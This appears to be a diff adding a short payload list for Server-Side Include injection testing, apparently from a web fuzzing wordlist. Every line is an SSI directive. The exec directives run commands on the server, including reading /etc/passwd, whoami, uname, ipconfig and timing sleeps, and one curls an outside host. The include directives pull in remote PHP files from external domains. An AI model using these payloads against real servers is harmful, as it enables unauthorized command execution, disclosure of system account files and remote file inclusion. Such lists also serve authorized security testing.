@@ -1,0 +1,14 @@
+<!--#echo var="DATE_LOCAL" --> 
+<!--#exec cmd="cat /etc/passwd" -->
+<!--#exec cmd="curl http://xerosecurity.com/.testing/rfi_vuln.php" -->
+<!--#exec cmd="ipconfig" -->
+<!--#exec cmd="perl -e 'print "X"*5000'" -->
+<!--#exec cmd="sleep 10" -->
+<!--#exec cmd="sleep 5" -->
+<!--#exec cmd="uname" -->
+<!--#exec cmd="whoami" -->
+<!--#exec cmd="whoami"--> 
+<!--#include virtual="/" -->
+<!--#include virtual="http://xerosecurity.com/.testing/rfi_vuln.php" -->
+<!--#include virtual="https://crowdshield.com/.testing/rfi_vuln.php" -->
+</nowiki>
